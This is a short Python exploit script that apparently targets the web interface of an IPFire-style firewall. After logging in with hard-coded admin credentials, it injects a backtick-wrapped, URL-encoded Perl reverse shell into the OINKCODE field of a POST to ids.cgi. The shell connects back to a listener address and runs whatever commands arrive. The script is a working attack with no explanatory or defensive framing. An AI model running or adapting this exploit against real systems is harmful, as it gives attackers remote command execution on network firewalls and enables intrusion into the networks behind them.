import requests

ip = '172.16.1.155'
user = 'admin'
password = '1pF1@dm#2020'
port = 444
lport = 666
lhost = '172.20.1.112'

r = requests.get(f'https://{ip}:{port}/cgi-bin/pakfire.cgi', auth=(user, password), verify=False)

print("Check: " + str(r.status_code))

def generate():
        return (
            "use IO;foreach my $key(keys %ENV){" +
            "if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,\"" +
            lhost +
            ":" +
            str(lport) +
            "\");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};"
        )

payload = "perl -MIO -e \"{}\"".format(generate())

payload2 = "perl%20-MIO%20-e%20%22use%20IO%3Bforeach%20my%20%24key%28keys%20%25ENV%29%7Bif%28%24ENV%7B%24key%7D%3D~%2F%28.%2A%29%2F%29%7B%24ENV%7B%24key%7D%3D%241%3B%7D%7D%24c%3Dnew%20IO%3A%3ASocket%3A%3AINET%28PeerAddr%2C%5C%22172.20.1.112%3A666%5C%22%29%3BSTDIN-%3Efdopen%28%24c%2Cr%29%3B%24~-%3Efdopen%28%24c%2Cw%29%3Bwhile%28%3C%3E%29%7Bif%28%24_%3D~%20%2F%28.%2A%29%2F%29%7Bsystem%20%241%3B%7D%7D%3B%22"

r_exploit = requests.post(
    f'https://{ip}:{port}/cgi-bin/ids.cgi',
    auth=(user, password),
    verify=False,
    headers={'Referer':f'https://{ip}:{port}/cgi-bin/ids.cgi'},
    data = {
        'ENABLE_SNORT_GREEN':'on',
        'ENABLESNORT':'on',
        'RULES':'registered',
        'OINKCODE':"`{}`".format(payload2),
        'ACTION':'Download new ruleset',
        'ACTION2':'snort'
        }
    )


print(r_exploit)